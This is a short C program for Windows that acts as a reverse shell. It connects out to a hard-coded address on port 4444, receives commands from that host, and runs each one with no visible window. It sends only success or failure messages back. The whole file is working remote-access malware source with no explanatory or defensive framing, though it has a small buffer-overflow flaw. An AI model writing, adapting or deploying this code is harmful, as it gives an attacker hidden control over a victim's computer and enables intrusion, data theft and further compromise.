#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#pragma comment(lib, "ws2_32.lib")

void execute_command(SOCKET socket) {
    char buffer[1024];
    int recv_size;
    while ((recv_size = recv(socket, buffer, sizeof(buffer), 0)) > 0) {
        buffer[recv_size] = '\0';
        if (strcmp(buffer, "exit") == 0) {
            printf("Closing connection\n");
            break; }

        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));

        if (!CreateProcess(NULL, buffer, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            const char *error_message = "Failed command\n";
            send(socket, error_message, strlen(error_message), 0);
        } else {
            WaitForSingleObject(pi.hProcess, INFINITE);
            const char *success_message = "Command executed successfully\n";
            send(socket, success_message, strlen(success_message), 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}

int main() {
    WSADATA wsaData;
    SOCKET socket_desc;
    struct sockaddr_in server;
    char *ip = "192.168.1.100";
    int port = 4444;

    // setup
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed. Error Code: %d\n", WSAGetLastError());
        return 1;    }
    socket_desc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (socket_desc == INVALID_SOCKET) {
        printf("Socket creation failed. Error Code: %d\n", WSAGetLastError());
        WSACleanup();
        return 1; }
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    if (connect(socket_desc, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Connection failed. Error Code: %d\n", WSAGetLastError());
        closesocket(socket_desc);
        WSACleanup();
        return 1; }

    execute_command(socket_desc);
    closesocket(socket_desc);
    WSACleanup();
    return 0;
}
